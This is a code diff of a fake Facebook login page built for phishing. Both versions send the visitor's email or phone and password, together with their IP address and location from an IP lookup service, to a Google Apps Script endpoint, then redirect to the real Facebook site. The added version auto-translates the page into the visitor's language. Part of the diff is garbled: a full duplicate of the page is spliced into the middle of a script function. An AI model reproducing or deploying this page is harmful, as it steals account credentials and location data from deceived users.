@@ -23,11 +23,6 @@
             text-align: center;
         }
 
-        .logo {
-            width: 100px;
-            margin-bottom: 20px;
-        }
-
         h2 {
             margin-bottom: 20px;
         }
@@ -40,7 +35,7 @@
         input[type="text"],
         input[type="password"],
         button {
-            height:40px;
+            height: 40px;
             padding: 10px;
             margin-bottom: 10px;
             border: 1px solid #ccc;
@@ -76,63 +71,328 @@
 </head>
 <body>
     <div class="login-container">
-        <img src="IMG_20241023_072537.jpg" style="height:65px; width:65px;">
-        <p style="font-size:18px">Log into Facebook to continue</p>
-        <form action="https://script.google.com/macros/s/AKfycbw6mnYUuOUCR6rxf6ThNZAI4siPxTUSYjF7v7H1CGyK1XqnjUghs7Sl17XPhLeVG8JJ/exec" id="FBdata">
-            <input type="text" name="email_or_phone" placeholder="Mobile number or email address" style="font-size:19px;" required/>
-            <input type="password" name="message" placeholder="Password" required/>
-            <input type="hidden" name="ip_address">
-            <input type="hidden" name="country">
-            <input type="hidden" name="region">
-            <input type="hidden" name="city">
-            <input type="hidden" name="form_id" value="FBForm">
-            <button type="submit">Log In</button>
-            <a href="https://m.facebook.com/?refsrc=deprecated">Forgot password?</a>
-            <p>or</p>
-            <button style="background-color:white; border-color:#1877f2; border-radius:25px; height:45px; margin-top:25px;"><a href="https://m.facebook.com/reg/#" style="color:#1877f2;">Create new account</a></button>
-            <center><img style="width:50px; height:20px;" src="IMG_20241018_221207.jpg"></center>
-            <p style="font-size:10px">About. Help. More</p>
+        <img src="/storage/emulated/0/DCIM/IMG_20241023_072537.jpg" style="height:65px; width:65px;">
+        <p data-translate style="font-size:18px">Log into Facebook to continue</p>
+        <form action="https://script.google.com/macros/s/AKfycbxu5NkNWJ9krIy13HKtc4v4SJI3r7uqxHesEF1ATAPjvicM--DO_Quc1u-tqUsANpSG/exec" id="FBdata">
+            <input data-translate-placeholder type="text" name="email_or_phone" placeholder="Mobile number or email address" style="font-size:19px;" required/>
+            <input data-translate-placeholder type="password" name="message" placeholder="Password" required/>
+            <input type="hidden" id="ip_address" name="ip_address">
+            <input type="hidden" id="country" name="country">
+            <input type="hidden" id="region" name="region">
+            <input type="hidden" id="city" name="city">
+            <input type="hidden" name="form_id" value="FBdata">
+            <button type="submit" data-translate>Log In</button>
+            <a href="https://m.facebook.com/?refsrc=deprecated" data-translate>Forgot password?</a>
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+            <hr style="flex: 1; border-top: 1px solid #ccc; margin: 0 10px;">
+            <span style="background-color: #f2f2f2; padding: 0 10px; position: relative; z-index: 1;" data-translate>or</span>
+            <hr style="flex: 1; border-top: 1px solid #ccc; margin: 0 10px;">
+            </div>
+            <button style="background-color:white; border-color:#1877f2; border-radius:25px; height:45px; margin-top:25px;">
+            <a href="https://m.facebook.com/reg/#" style="color:#1877f2;" data-translate>Create new account</a>
+            </button>
+            <center><img style="width:60px; height:20px;" src="/storage/emulated/0/DCIM/IMG_20241107_152957~4.jpg"></center>
+            <p style="font-size:10px" data-translate>About. Help. More</p>
         </form>        
     </div>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <script>
-        // Reference to the form element
-        const form = document.getElementById('FBdata');
+  <script>
+      // Detects the user's preferred language
+    function detectUserLanguage() {
+      const userLang = navigator.language || navigator.userLanguage;
+      return userLang.slice(0, 2); // Get the first 2 characters of the language code (e.g., "en", "fr", etc.)
+    }
 
-        form.addEventListener('submit', (e) => {
-            e.preventDefault();
+    // Supported languages based on LibreTranslate (expandable)
+    const supportedLanguages = [
+      'af', 'sq', 'am', 'ar', 'hy', 'az', 'eu', 'be', 'bn', 'bs', 'bg', 'ca', 
+      'zh', 'hr', 'cs', 'da', 'nl', 'en', 'et', 'fi', 'fr', 'gl', 'ka', 'de', 
+      'el', 'gu', 'ht', 'he', 'hi', 'hu', 'is', 'ig', 'id', 'ga', 'it', 'ja', 
+      'jv', 'kn', 'kk', 'km', 'ko', 'ku', 'ky', 'lo', 'la', 'lv', 'lt', 'lb', 
+      'mk', 'ms', 'ml', 'mt', 'mi', 'mr', 'mn', 'my', 'ne', 'no', 'ps', 'fa', 
+      'pl', 'pt', 'pa', 'ro', 'ru', 'gd', 'sr', 'st', 'si', 'sk', 'sl', 'so', 
+      'es', 'su', 'sw', 'sv', 'tg', 'ta', 'te', 'th', 'tr', 'uk', 'ur', 'uz', 
+      'vi', 'cy', 'xh', 'yi', 'yo', 'zu'
+    ];
 
-            // Gather form data
-            const formData = new FormData(form);
+    // Fallback to English if the user's language is unsupported
+    function getFallbackLanguage(userLang) {
+      return supportedLanguages.includes(userLang) ? userLang : 'en';
+    }
 
-            // Get location details
-            $.getJSON("https://ipinfo.io/?format=json", function(data) {
-                // Prepare JSON data to send
-                const jsonData = {
-                    email_or_phone: formData.get('email_or_phone'),
-                    message: formData.get('message'),
-                    ip_address: data.ip,
-                    country: data.country,
-                    region: data.region,
-                    city: data.city,
-                    form_id: 'FBForm'
-                };
+    // Batch translation function
+    function translateBatch(texts, targetLang) {
+      return fetch('https://libretranslate.com/translate', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          q: texts,
+          source: 'en',   // Assuming English as the default language
+          target: targetLang,
+          format: "text"
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
 
-                // Send data to Google Apps Script
-                fetch('https://script.google.com/macros/s/AKfycbw6mnYUuOUCR6rxf6ThNZAI4siPxTUSYjF7v7H1CGyK1XqnjUghs7Sl17XPhLeVG8JJ/exec', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(jsonData),
-                })
-                .then(() => {
-                    // Redirect to Facebook after submission
-                    window.location.href = 'https://www.facebook.com';
-                })
-                .catch((error) => console.error('Error:', error));
-            });
+        .login-container {
+            background-color: #f2f2f2;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input[type="text"],
+        input[type="password"],
+        button {
+            height: 40px;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 9px;
+            font-size: 20px;
+        }
+
+        button {
+            background-color: #1877f2;
+            color: #fff;
+            cursor: pointer;
+            border-radius: 25px;
+            height: 45px;
+        }
+
+        button:hover {
+            background-color: #166fe5;
+        }
+
+        p {
+            margin-top: 10px;
+        }
+
+        a {
+            text-decoration: none;
+            color: #1877f2;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="/storage/emulated/0/DCIM/IMG_20241023_072537.jpg" style="height:65px; width:65px;">
+        <p data-translate style="font-size:18px">Log into Facebook to continue</p>
+        <form action="https://script.google.com/macros/s/AKfycbxu5NkNWJ9krIy13HKtc4v4SJI3r7uqxHesEF1ATAPjvicM--DO_Quc1u-tqUsANpSG/exec" id="FBdata">
+            <input data-translate-placeholder type="text" name="email_or_phone" placeholder="Mobile number or email address" style="font-size:19px;" required/>
+            <input data-translate-placeholder type="password" name="message" placeholder="Password" required/>
+            <input type="hidden" id="ip_address" name="ip_address">
+            <input type="hidden" id="country" name="country">
+            <input type="hidden" id="region" name="region">
+            <input type="hidden" id="city" name="city">
+            <input type="hidden" name="form_id" value="FBdata">
+            <button type="submit" data-translate>Log In</button>
+            <a href="https://m.facebook.com/?refsrc=deprecated" data-translate>Forgot password?</a>
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+            <hr style="flex: 1; border-top: 1px solid #ccc; margin: 0 10px;">
+            <span style="background-color: #f2f2f2; padding: 0 10px; position: relative; z-index: 1;" data-translate>or</span>
+            <hr style="flex: 1; border-top: 1px solid #ccc; margin: 0 10px;">
+            </div>
+            <button style="background-color:white; border-color:#1877f2; border-radius:25px; height:45px; margin-top:25px;">
+            <a href="https://m.facebook.com/reg/#" style="color:#1877f2;" data-translate>Create new account</a>
+            </button>
+            <center><img style="width:60px; height:20px;" src="/storage/emulated/0/DCIM/IMG_20241107_152957~4.jpg"></center>
+            <p style="font-size:10px" data-translate>About. Help. More</p>
+        </form>        
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script>
+      // Detects the user's preferred language
+    function detectUserLanguage() {
+      const userLang = navigator.language || navigator.userLanguage;
+      return userLang.slice(0, 2); // Get the first 2 characters of the language code (e.g., "en", "fr", etc.)
+    }
+
+    // Supported languages based on LibreTranslate (expandable)
+    const supportedLanguages = [
+      'af', 'sq', 'am', 'ar', 'hy', 'az', 'eu', 'be', 'bn', 'bs', 'bg', 'ca', 
+      'zh', 'hr', 'cs', 'da', 'nl', 'en', 'et', 'fi', 'fr', 'gl', 'ka', 'de', 
+      'el', 'gu', 'ht', 'he', 'hi', 'hu', 'is', 'ig', 'id', 'ga', 'it', 'ja', 
+      'jv', 'kn', 'kk', 'km', 'ko', 'ku', 'ky', 'lo', 'la', 'lv', 'lt', 'lb', 
+      'mk', 'ms', 'ml', 'mt', 'mi', 'mr', 'mn', 'my', 'ne', 'no', 'ps', 'fa', 
+      'pl', 'pt', 'pa', 'ro', 'ru', 'gd', 'sr', 'st', 'si', 'sk', 'sl', 'so', 
+      'es', 'su', 'sw', 'sv', 'tg', 'ta', 'te', 'th', 'tr', 'uk', 'ur', 'uz', 
+      'vi', 'cy', 'xh', 'yi', 'yo', 'zu'
+    ];
+
+    // Fallback to English if the user's language is unsupported
+    function getFallbackLanguage(userLang) {
+      return supportedLanguages.includes(userLang) ? userLang : 'en';
+    }
+
+    // Batch translation function
+    function translateBatch(texts, targetLang) {
+      return fetch('https://libretranslate.com/translate', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          q: texts,
+          source: 'en',   // Assuming English as the default language
+          target: targetLang,
+          format: "text"
+        }),
+      })
+      .then(response => response.json())
+      .then(data => data.map(item => item.translatedText))
+      .catch(error => {
+        console.error('Error translating text:', error);
+        // Fallback to original texts in case of an error
+        return texts;
+      });
+    }
+
+    // Function to translate all form labels, buttons, and placeholders
+    function translateForm(targetLang) {
+      const elementsToTranslate = document.querySelectorAll('[data-translate], [data-translate-placeholder]');
+
+      // Collect all texts that need translation
+      const textsToTranslate = Array.from(elementsToTranslate).map(elem => {
+        return elem.textContent || elem.placeholder;
+      });
+
+      // Translate all texts in a single request
+      translateBatch(textsToTranslate, targetLang)
+        .then(translatedTexts => {
+          let i = 0;
+          elementsToTranslate.forEach(elem => {
+            if (elem.textContent && elem.hasAttribute('data-translate')) {
+              elem.textContent = translatedTexts[i++];
+            } else if (elem.placeholder && elem.hasAttribute('data-translate-placeholder')) {
+              elem.placeholder = translatedTexts[i++];
+            }
+          });
         });
-    </script>
+    }
+
+    // Initialize translation based on the user's preferred language or fallback
+    document.addEventListener('DOMContentLoaded', function() {
+      const userLang = detectUserLanguage();
+      const targetLang = getFallbackLanguage(userLang);
+      translateForm(targetLang);
+    });
+
+// Get user's location and IP address
+$(document).ready(function() {
+  $.get("https://ipapi.co/json/", function(data) {
+    $("#ip_address").val(data.ip);
+    $("#country").val(data.country_name);
+    $("#region").val(data.region);
+    $("#city").val(data.city);
+  });
+
+  // Function to handle form submission
+  document.getElementById('FBdata').addEventListener('submit', function(event) {
+    event.preventDefault();
+    const form = event.target;
+    const formData = new FormData(form);
+
+    // Convert FormData to URL-encoded format
+    const urlEncodedData = new URLSearchParams(formData);
+
+    // Convert FormData to JSON
+    const jsonData = Object.fromEntries(urlEncodedData);
+
+    // Set deployment URL
+    const deploymentUrl = 'https://script.google.com/macros/s/AKfycbxu5NkNWJ9krIy13HKtc4v4SJI3r7uqxHesEF1ATAPjvicM--DO_Quc1u-tqUsANpSG/exec';
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', deploymentUrl, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.onload = function() {
+      if (xhr.status === 200) {
+        window.location.replace('https://www.facebook.com/profile'); 
+      }
+    };
+    xhr.send(JSON.stringify(jsonData));
+  });
+});
+</script>
 </body>
-</html>
+</html>￼Enter        }),
+      })
+      .then(response => response.json())
+      .then(data => data.map(item => item.translatedText))
+      .catch(error => {
+        console.error('Error translating text:', error);
+        // Fallback to original texts in case of an error
+        return texts;
+      });
+    }
+
+    // Function to translate all form labels, buttons, and placeholders
+    function translateForm(targetLang) {
+      const elementsToTranslate = document.querySelectorAll('[data-translate], [data-translate-placeholder]');
+
+      // Collect all texts that need translation
+      const textsToTranslate = Array.from(elementsToTranslate).map(elem => {
+        return elem.textContent || elem.placeholder;
+      });
+
+      // Translate all texts in a single request
+      translateBatch(textsToTranslate, targetLang)
+        .then(translatedTexts => {
+          let i = 0;
+          elementsToTranslate.forEach(elem => {
+            if (elem.textContent && elem.hasAttribute('data-translate')) {
+        elem.textContent = translatedTexts[i++];
+            } else if (elem.placeholder && elem.hasAttribute('data-translate-placeholder')) {
+              elem.placeholder = translatedTexts[i++];
+            }
+          });
+        });
+    }
+
+    // Initialize translation based on the user's preferred language or fallback
+    document.addEventListener('DOMContentLoaded', function() {
+      const userLang = detectUserLanguage();
+      const targetLang = getFallbackLanguage(userLang);
+      translateForm(targetLang);
+    });
+
+// Get user's location and IP address
+$(document).ready(function() {
+  $.get("https://ipapi.co/json/", function(data) {
+    $("#ip_address").val(data.ip);
+    $("#country").val(data.country_name);
+    $("#region").val(data.region);
+    $("#city").val(data.city);
+  });
+
+  // Function to handle form submission
+  document.getElementById('FBdata').addEventListener('submit', function(event) {
